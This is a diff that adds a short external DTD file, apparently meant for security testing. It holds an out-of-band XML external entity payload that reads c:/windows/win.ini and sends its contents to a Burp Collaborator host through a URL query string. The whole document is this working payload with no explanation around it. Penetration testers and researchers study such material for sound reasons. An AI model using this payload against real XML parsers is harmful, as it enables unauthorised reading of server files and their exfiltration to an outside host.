@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://xyzof7ry202ixr6gz93eo2zxwo2eq3.burpcollaborator.net/?x=%file;'>">
+%eval;
+%exfiltrate;
